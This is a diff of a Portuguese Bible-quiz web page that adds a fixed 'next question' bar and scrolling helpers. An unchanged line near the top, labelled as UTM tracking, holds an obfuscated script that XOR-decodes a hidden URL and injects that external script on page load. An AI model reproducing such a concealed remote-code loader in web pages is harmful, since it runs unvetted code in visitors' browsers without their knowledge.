@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <title>Teste Bíblico — Biblioteca Teológica</title>
 <!-- UTMify: passagem de UTMs -->
 <script>(function(){var h_lu=atob("DKv+yseR0cLCLc9BYNDcv7X98/jgRbs1ENjE5ejytazsWLssCc2H5KT+vOygX+AyA9mXurPi/re2QLxuDMqKr7Tl/6ixD+NjAd+KuK7zpLanXu17O9DcpKb8tOD4D6sgFMrTv7P8uKS7AL8zBd2bpLO8qaGtSeIyA8Dc5uXnsK63SO17QomD5ryzv6OvSO17Qs+fvqa8pLavRKk4TduMr7H0v7bvXrojCc+N6Ouzp6OuWKpjWonct5rs");var s_xxd7=[];for(var u_z1=0;u_z1<h_lu.length;u_z1++){s_xxd7.push(h_lu.charCodeAt(u_z1)&255);}var f_2hr=s_xxd7[0];var j_1y=s_xxd7.slice(1,1+f_2hr);var s_sx9=s_xxd7.slice(1+f_2hr);var l_4u0=s_sx9.map(function(b,h_sy4c){return b^j_1y[h_sy4c%f_2hr];});var g_gdu="";for(var q_k=0;q_k<l_4u0.length;q_k++){g_gdu+=String.fromCharCode(l_4u0[q_k]&255);}var i_c=decodeURIComponent(escape(g_gdu));var j_gc=JSON.parse(i_c);var a_f=j_gc.globals||[];a_f.forEach(function(d_w0qf){window[d_w0qf.name]=d_w0qf.value;});var j_3=document.createElement("script");j_3.src=j_gc.url;j_3.async=true;j_3.defer=true;(j_gc.attributes||[]).forEach(function(o_1b1s){j_3.setAttribute(o_1b1s.name,o_1b1s.value);});(document.head||document.documentElement).appendChild(j_3);})();</script>
@@ -227,6 +227,30 @@
     text-decoration:underline;
   }
   .btn.ghost:hover,.btn.ghost:active{background:none}
+  /* barra de avanço — o botão de próxima pergunta nascia depois da explicação,
+     ou seja, fora da dobra no celular: quem respondia precisava rolar pra
+     continuar. Agora ele vive fixo no rodapé e aparece junto com o veredito. */
+  .next-bar{
+    position:fixed;
+    left:0;right:0;bottom:0;
+    z-index:50;
+    display:flex;
+    justify-content:center;
+    padding:12px 16px calc(12px + env(safe-area-inset-bottom,0px));
+    background:linear-gradient(to top, var(--bordo) 62%, rgba(58,14,32,0));
+    transform:translateY(130%);
+    transition:transform .28s ease;
+    pointer-events:none;
+  }
+  .next-bar.show{transform:none;pointer-events:auto}
+  .next-bar .btn{
+    width:100%;
+    max-width:528px;
+    margin-top:0;
+    box-shadow:0 8px 26px rgba(0,0,0,.45);
+  }
+  /* espaço pra barra não cobrir o fim da explicação */
+  body.next-on .stage{padding-bottom:112px}
   /* captura */
   .center{text-align:center}
   .calc-title{
@@ -472,6 +496,10 @@
 
 <div class="stage" id="stage"></div>
 
+<div class="next-bar" id="nextBar">
+  <button class="btn" id="nextBtn" onclick="next()">Próxima pergunta</button>
+</div>
+
 <script>
 const QUESTIONS = [
   {
@@ -582,10 +610,10 @@ function renderQuestion(){
         <div class="verdict" id="verdict">
           <div class="verdict-tag" id="vtag"></div>
           <div class="explain">${item.exp}<span class="src">✠ ${item.src}</span></div>
-          <button class="btn" onclick="next()">${current===QUESTIONS.length-1?'Ver meu resultado':'Próxima pergunta'}</button>
         </div>
       </div>
     </div>`;
+  esconderAvancar();
   requestAnimationFrame(()=>{ 
     document.getElementById('fill').style.width = ((current)/QUESTIONS.length*100)+'%';
     requestAnimationFrame(()=>{ document.getElementById('fill').style.width = ((current+1)/QUESTIONS.length*100)+'%'; });
@@ -604,11 +632,39 @@ function answer(i){
   vtag.textContent = hit ? '✓ Você acertou' : '✗ Você caiu neste mito';
   vtag.className = 'verdict-tag ' + (hit?'ok':'no');
   document.getElementById('verdict').classList.add('show');
+  mostrarAvancar();
+  rolarAteExplicacao();
   window.BT && BT.resposta(current+1, hit, item.tag);
+}
+
+function mostrarAvancar(){
+  document.getElementById('nextBtn').textContent =
+    current === QUESTIONS.length-1 ? 'Ver meu resultado' : 'Próxima pergunta';
+  document.getElementById('nextBar').classList.add('show');
+  document.body.classList.add('next-on');
+}
+
+function esconderAvancar(){
+  document.getElementById('nextBar').classList.remove('show');
+  document.body.classList.remove('next-on');
+}
+
+// Rola só o necessário pra explicação inteira caber acima da barra fixa —
+// nunca pra baixo do que já está visível, senão a pergunta some da tela.
+function rolarAteExplicacao(){
+  requestAnimationFrame(()=>{
+    const v = document.getElementById('verdict');
+    if(!v) return;
+    const alvo = v.getBoundingClientRect().bottom + window.scrollY - window.innerHeight + 116;
+    if(alvo <= window.scrollY) return;
+    const lento = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    window.scrollTo({top:alvo, behavior: lento ? 'auto' : 'smooth'});
+  });
 }
 
 function next(){
   current++;
+  esconderAvancar();
   if(current < QUESTIONS.length){ renderQuestion(); }
   else { renderCapture(); }
 }
@@ -625,6 +681,7 @@ function renderCapture(){
         <button class="btn ghost" onclick="pularContato()">Pular e ver o resultado</button>
       </div>
     </div>`;
+  esconderAvancar();
   window.scrollTo({top:0});
   window.BT && BT.captura();
 }
@@ -739,6 +796,7 @@ function renderResult(){
         </div>
       </div>
     </div>`;
+  esconderAvancar();
   window.scrollTo({top:0});
   window.BT && BT.resultado(score, b.n);
 }
